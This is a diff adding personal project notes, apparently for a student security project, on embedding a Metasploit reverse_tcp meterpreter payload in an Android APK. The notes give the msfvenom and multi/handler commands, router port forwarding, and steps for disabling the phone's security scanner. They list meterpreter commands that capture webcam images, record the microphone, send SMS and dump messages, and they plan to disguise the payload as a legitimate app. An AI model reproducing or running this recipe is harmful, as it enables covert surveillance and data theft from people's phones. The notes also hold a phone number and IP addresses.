@@ -1,0 +1,53 @@
+SO FAR:
+
+-downloaded a couple apks
+	-snapchat - seemed wrong - very large, lots of conflicting plugins
+	-discord - a little better
+		-BOTH ARE UNSTABLE AND CRASH
+		-should possibly move on to much simpler apk
+-download and setup metasploit, a penetration testing software
+	-download zipalign, jarsigner, apktool, keytool
+	-set on OS PATH variable
+
+-these are the best starting points
+ file:///C:/Users/RileyTrent/Desktop/Security%20Project/How%20to%20inject%20malicious%20payloads%20to%20android%20application.html
+ https://null-byte.wonderhowto.com/how-to/embed-metasploit-payload-original-apk-file-part-2-do-manually-0167124/
+ https://hackingworld.in/hack-android-phone-metasploit/
+
+-created payloads using msfvenom.bat
+	-msfvenom.bat -p android/meterpreter/reverse_tcp LHOST=74.110.147.124 LPORT=4444 R > hackingworld5.apk
+		-LHOST is public IP address
+		-set up port forward 4444 to local ip address 192.168.1.230 in verizon router settings at 192.168.1.1
+
+-had to change settings on target device
+	-allow installation of apks (enable developer options)
+	-disable Verizon Security and Privacy from scanning incoming apk installations, as this was blocking the payload apk
+
+-set up port forwarding
+	-set up port forward 4444 to local ip address 192.168.1.230 in verizon router settings at 192.168.1.1
+	-this forwards requests to public IP 74.110.147.124 port 4444 to local ip 192.168.1.230
+	-exploit can be run through internet now, much more powerful
+
+-setup meterpreter in msfconsole
+	-msfconsole.bat
+	-msf > use multi/handler
+	-msf (multi/handler) > set PAYLOAD android/meterpreter/reverse_tcp
+	-msf (multi/handler) > set LHOST 192.168.1.230
+	-msf (multi/handler) > set LPORT 4444
+	-msf (multi/handler) > exploit
+
+-current working payload is hackingworld5.apk in the metasploit bin folder
+	-webcam_snap -i 2	(takes front cam pic, -i 1 takes back cam pic)
+	-webcam_stream
+	-record_mic -d 20	(records from mic for 10 seconds, not sure exactly what the number denotes)
+	-send_sms -d "8043324262" -t "hello"	(sends the text "hello" to phone number 8043324262)
+	-sms_dump	(saves all sms messagse as a text file)
+	-many more commands to test
+
+-TODO
+	-mount to legitimate looking application
+	-investigate static vs dynamic public IP address for long term exploitation
+	-make presentation
+
+		
+ 
